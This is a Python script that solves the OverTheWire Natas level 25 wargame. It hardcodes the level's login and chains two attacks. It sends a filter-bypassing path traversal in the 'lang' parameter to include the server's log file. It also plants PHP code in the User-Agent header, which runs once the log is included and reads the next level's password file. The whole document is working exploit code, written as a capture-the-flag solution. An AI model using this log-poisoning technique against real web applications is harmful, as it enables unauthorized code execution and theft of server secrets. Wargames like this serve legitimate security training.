#!/bin/python
import requests

url = "http://natas25.natas.labs.overthewire.org"
auth = ("natas25", "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx")

params = ''.join(["lang=", "../"])
r1 = requests.get(url, auth=auth, params=params)

cookies = dict(PHPSESSID=r1.cookies["PHPSESSID"])
params = ''.join(["lang=", "....//....//....//....//....//var/www/natas/natas25/logs/natas25_",
                 r1.cookies["PHPSESSID"], ".log"])
headers = {
    "User-Agent": '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
}
r2 = requests.get(url, auth=auth, params=params,
                  cookies=cookies, headers=headers)

print(r2.request.url)
print(r2.text)
